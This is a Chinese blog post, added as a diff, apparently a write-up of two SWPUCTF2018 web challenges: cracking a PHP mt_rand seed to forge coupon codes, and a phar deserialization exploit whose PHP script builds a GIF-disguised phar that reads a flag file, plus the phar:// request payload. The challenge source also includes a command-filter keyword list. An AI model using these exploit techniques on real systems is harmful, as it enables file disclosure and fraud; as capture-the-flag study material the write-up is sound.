@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="http://some.url/to/favicon.ico">
+    <title>SWPUCTF2018-不得贪胜</title>
+    
+        
+            <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/academicons/1.8.6/css/academicons.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/font-awesome/5.9.0/css/all.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+        
+    
+    
+<link rel="stylesheet" href="/css/adagio.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="container-fluid">
+    <nav class="nav">
+        <div class="collapse navbar-collapse" id="navbar-sm">
+            
+            
+            <div class="navbar-nav">
+                <a href="http://forthrglory.com" target="_blank" rel="noopener" class="nav-item nav-link">forthrglory</a>
+            </div>
+            
+        </div>
+    </nav>
+</div>
+
+<div class="d-flex d-md-none" style="width: 100%; background-color: #e9ecef">
+    
+    <div class="nav">
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar-sm"
+            aria-expanded="false" aria-label="Toggle Navigation">
+            <i class="fas fa-bars fa-lg"></i>
+        </button>
+    </div>
+    
+    <nav class="navbar ml-auto">
+        <a class="navbar-brand" href="/">
+            
+            Forthrglory
+            
+        </a>
+    </nav>
+</div>
+
+
+<div class="container d-none d-md-block my-navbar">
+    <nav class="navbar navbar-expand-sm navbar-light bg-transparent">
+        <a class="navbar-brand " href="/">
+            
+            Forthrglory
+            
+        </a>
+        
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
+            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+                
+                <li class="nav-item pl-2 pr-2 ">
+                    <a class="nav-link" href="http://forthrglory.com" target="_blank" rel="noopener">forthrglory</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </nav>
+</div>
+
+
+
+
+    <div class="jumbotron jumbotron-fluid">
+    <div class="container">
+        
+        <h1 class="mt-4 article-title page-title">SWPUCTF2018</h1>
+        
+        <p class="lead text-gray mt-3">By Anonymous; Published on 2018-12-23</p>
+        
+        <div class="tags">
+            <ul class="tag-list">
+                
+                <li class="tag-list-item">
+                    <a class="tag-list-link" href="/tags/WP/">WP</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </div>
+</div>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-9 pt-2">
+                <div class="row">
+                    <div class="col-12">
+                        <main>
+                            <article class="article-text page-content"><h3 id="这两天做了做西南石油的ctf，学到了很多知识！不亏，血赚"><a href="#这两天做了做西南石油的ctf，学到了很多知识！不亏，血赚" class="headerlink" title="这两天做了做西南石油的ctf，学到了很多知识！不亏，血赚"></a>这两天做了做西南石油的ctf，学到了很多知识！不亏，血赚</h3><h2 id="WEB狗"><a href="#WEB狗" class="headerlink" title="WEB狗"></a>WEB狗</h2><h4 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X ?"></a>用优惠码 买个 X ?</h4><p>题目挺简单的，就是思路有点难找，感谢朱先进表哥的指导。</br><br>思路就是利用他给你的十五位随机数找到种子，然后手动播种种子生成二十四位优惠码，接着系统命令执行拿到flag</br><br>首先扫了一下目录，发现了<a href="http://www.zip，拿到源码" target="_blank" rel="noopener">www.zip，拿到源码</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;生成优惠码</span><br><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">	mt_srand($_SESSION[&#39;seed&#39;]);</span><br><span class="line">    $str_rand &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth&#x3D;&#39;&#39;;</span><br><span class="line">    $len&#x3D;15;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;&#x3D;($len&#x2F;2))</span><br><span class="line">              $auth.&#x3D;substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.&#x3D;substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&#39;Auth&#39;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;support</span><br><span class="line">	if (preg_match(&quot;&#x2F;^\d+\.\d+\.\d+\.\d+$&#x2F;im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;&#x2F;\?|flag|&#125;|cat|echo|\*&#x2F;i&quot;,$ip))&#123;</span><br><span class="line">               &#x2F;&#x2F;执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              &#x2F;&#x2F;flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">             &#x2F;&#x2F; 你的输入不正确!</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审计代码，发现首先在0-999999999中随机一个种子，然后播种生成十五位优惠码，其中前八位是从头到尾添加，后七位是从尾到头添加，写个脚本找到优惠码原来的位置，然后利用大佬写的C语言php_mt_seed找到种子即可<br>附上脚本，为了方便生成的是php_mt_seed可以直接使用的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#-*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">str_rand &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">str_rand_2 &#x3D; str_rand[::-1]</span><br><span class="line">s &#x3D; &quot;sao78b1068vzrez&quot;</span><br><span class="line">length &#x3D; 7</span><br><span class="line">for i in range(0, 8):</span><br><span class="line">    p &#x3D; str_rand.find(s[i])</span><br><span class="line">    #print(type(p))</span><br><span class="line">    print(str(p) + &#39; &#39; + str(p) + &#39; &#39; + &#39;0 &#39; + str(len(str_rand) - 1) + &#39; &#39;, end&#x3D;&quot;&quot;)</span><br><span class="line">for i in range(8, 15):</span><br><span class="line">    p &#x3D; str_rand_2.find(s[i])</span><br><span class="line">    #print(type(p))</span><br><span class="line">    print(str(p + 1) + &#39; &#39; + str(p + 1) + &#39; &#39; + &#39;0 &#39; + str(len(str_rand_2) - 1) + &#39; &#39;, end&#x3D;&quot;&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/2830605891/Picture/pic/RBMKI3%25%5BEENS2Z5%7DSR1OM%7BC.png" alt="image"><br>丢到php_mt_seed中<br><img src="https://raw.githubusercontent.com/2830605891/Picture/pic/321.png" alt="image"></br><br>这里可以看到成功找到了种子=778324937，接下来手动播种生成二十四位优惠码即可(注意，这里生成的二十四位优惠码只需将len改成24即可)</br><br><img src="https://raw.githubusercontent.com/2830605891/Picture/pic/654.png" alt="image"></br><br>可以看到这里成功生成了优惠码，接下来购买然后获取flag即可</br><br><img src="https://raw.githubusercontent.com/2830605891/Picture/pic/987.png" alt="image"></p>
+<h4 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h4><p>这道题目一开始没有思路，在file哪儿可以进行文件读取，以为是上传，但是并没有绕过，于是问了下表哥，路通表哥说是phar反序列化，又去恶补了一番伪协议</br><br>phar简单来说是一个API，用于压缩对象，具体的我也不太会解释，参考<a href="https://xz.aliyun.com/t/2613" target="_blank" rel="noopener">这里</a></br><br>题目的思路：</p>
+<ol>
+<li>C1e4r-&gt;__construct($name)—-&gt;$this.str;</li>
+<li>C1e4r-&gt;__destruct()—-&gt;$this.test-&gt;str;</li>
+<li>Show-&gt;__toString()—-&gt;$this.str[‘str’] == Test()-&gt;source;</li>
+<li>Test()-&gt;__get(source)—-&gt;Test()-&gt;get(source)-&gt;$this.params[‘source’]-&gt;’f1ag.php’—-&gt;Test()-&gt;file_get(‘f1ag.php’);<br>附上代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str &#x3D; $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test &#x3D; $this-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key &#x3D; $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value &#x3D; $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text &#x3D; base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p1 &#x3D; new Show();</span><br><span class="line">$p2 &#x3D; new Test();</span><br><span class="line">$p2-&gt;params &#x3D; array(&quot;source&quot;&#x3D;&gt;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&quot;);</span><br><span class="line">$p1-&gt;str &#x3D; array(</span><br><span class="line">    &quot;str&quot;&#x3D;&gt;$p2,</span><br><span class="line">    );</span><br><span class="line">$poc &#x3D; new C1e4r($p1);</span><br><span class="line">$phar &#x3D; new Phar(&#39;phar.phar&#39;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);</span><br><span class="line">$phar -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);</span><br><span class="line">$phar -&gt; setMetadata($poc);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+这是路通表哥写的代码，我没有写出来，看完之后也明白了</br><br>代码传进去后，将字符串反序列化之后消亡C1e4r这个类的对象，此时会调用<strong>destruct方法，将str属性的值赋给test属性并打印出来，而我们在脚本中就将对象的str属性设置为了Show类所实例化的一个对象，因此他回去调用Show类的</strong>toString方法， 这个方法会将对象的str属性所指向的数组中下标为’str’的对象的source方法，而脚本中我们将下标为str的对象实例化为Test类的对象，因此会去访问Test类的source属性，但是这个类并没有这个属性，这是访问了不存在的属性，就会去调用<strong>get方法，</strong>get方法调用get方法，get方法中会去查看Test类中的params属性所指向的数组中存不存在下标为’source’的值，存在则会将value属性实例化为这个值，脚本中我们将这个值赋为’/var/www/html/f1ag.php’字符串，因此value=’/var/www/html/f1ag.php’，接着调用file_get方法，将访问value的值并用base64编码后返回，于是，一开始的__destruct所输出的，就是f1ag.php这个文件base64编码后的内容，即成功拿到了flag</br><br>以上是题目的思路，接下来我们做题，利用代码生成一个phar文件，因为系统是根据内容来识别是否是phar文件的，所以我们将后缀改成.gif以绕过检测</br><br><img src="https://raw.githubusercontent.com/2830605891/Picture/pic/32165498.png" alt=""></br>
+上传成功，接着构造playload
+
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;be6e8ad243dbf7279851559e70005a62.jpg</span><br></pre></td></tr></table></figure>
+
+<p>base64解码一下即可成功拿到flag</p>
+</article>
+                        </main>
+                        
+                        
+                    </div>
+                </div>
+                <div class="row mt-5 mb-5">
+                    <div class="col-12">
+                        <div class="row">
+    <div class="col">
+        <nav aria-label="paginator" class="paginator">
+            <ul class="pagination d-none d-md-flex pagination-lg justify-content-center">
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2018/12/23/%E7%A7%91%E6%9D%A5%E6%9D%AF/"
+                        aria-label="Previous">
+                        <span aria-hidden="true">&laquo;
+                            山东省大学生网络安全竞赛2018</span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                </li>
+                <li class="page-item  disabled ">
+                    <a class="page-link"
+                        href=""
+                        aria-label="Next">
+                        <span
+                            aria-hidden="true">No more
+                            &raquo;</span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </li>
+            </ul>
+            <ul class="pagination d-md-none justify-content-center">
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2018/12/23/%E7%A7%91%E6%9D%A5%E6%9D%AF/"
+                        aria-label="Previous">
+                        <span aria-hidden="true">&laquo;
+                            山东省大学生网络安全竞赛2018</span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                </li>
+                <li class="page-item  disabled ">
+                    <a class="page-link"
+                        href=""
+                        aria-label="Next">
+                        <span
+                            aria-hidden="true">No more
+                            &raquo;</span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</div>
+
+
+
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-12">
+                        <div id="vcomment"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="container pt-4 page-sidebar">
+                    
+                    <div class="row">
+    <div class="col">
+        <h6>APPLAUSE FOR ME</h6>
+        <div id="applause-easy"></div>
+    </div>
+</div>
+                    
+                    <hr class="row">
+                    <div class="row toc-container">
+                        <div class="col-12">
+                            <h6>NAVIGATION</h6>
+                            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#这两天做了做西南石油的ctf，学到了很多知识！不亏，血赚"><span class="toc-text">这两天做了做西南石油的ctf，学到了很多知识！不亏，血赚</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB狗"><span class="toc-text">WEB狗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#用优惠码-买个-X"><span class="toc-text">用优惠码 买个 X ?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SimplePHP"><span class="toc-text">SimplePHP</span></a></li></ol></li></ol>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+    <div class="jumbotron jumbotron-fluid mb-0">
+        <div class="container-fluid">
+            <div class="col text-center">
+                <div class="bottom-social">
+                    <div class="row">
+    <div class="col text-center">
+        <ul class="list-inline">
+            
+            <li class="list-inline-item">
+                
+                <a href="https://github.com/forthrglory" target="_blank" rel="noopener">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.facebook.com/xxxxx" target="_blank" rel="noopener">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.pinterest.com/xxxxx" target="_blank" rel="noopener">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-pinterest-p fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.linkedin.com/in/xxxxx" target="_blank" rel="noopener">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-linkedin-in fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+                </div>
+                <p class="copyright text-muted">
+                    Copyright &copy; Hexo
+                    <br>
+                    Thanks for coming!
+                    <br>
+                    <a href="https://github.com/Hanlin-Dong/hexo-theme-adagio" target="_blank" rel="noopener">Adagio</a> - A <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> theme made with love by
+                    <a href="http://www.hanlindong.com" target="_blank" rel="noopener">Hanlin Dong</a>.
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    
+    
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.slim.min.js"></script>
+        <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdn.bootcss.com/font-awesome/5.9.0/js/all.min.js"></script>
+         
+            <script type="text/x-mathjax-config">
+                MathJax.Hub.Config({
+                    CommonHTML: { linebreaks: { automatic: true } },
+                    "HTML-CSS": { linebreaks: { automatic: true } },
+                    SVG: { linebreaks: { automatic: true } }
+                });
+            </script>
+            <script src='https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+        
+    
+
+
+
+<script src="/js/av.min.js"></script>
+
+
+<script src="/js/valine.min.js"></script>
+
+
+<script src="/js/applause-easy.js"></script>
+
+
+<script>
+$(document).ready(function() {
+    var a = new ApplauseEasy({
+        id: 'applause-easy',
+        appId: "xxxxxxxxxx",
+        appKey: "xxxxxxxxxx",
+        img_src: "http://img.hanlindong.com/blog/site/clap.png",
+        img_width: "50px",
+        img_height: "50px"
+    })
+})
+</script>
+
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?123456789";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-11111111-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+    gtag('config', 'UA-11111111-1');
+</script>
+
+
+    
+    <script>
+    new Valine({
+        el: "#vcomment",
+        appId: "xxxxxxxxxx",
+        appKey: "xxxxxxxxxx",
+        notify: false,
+        varify: false,
+        avatar: 'identicon',
+        placeholder: "",
+        recordIP: true
+    })
+</script>
+    
+</body>
+</html>
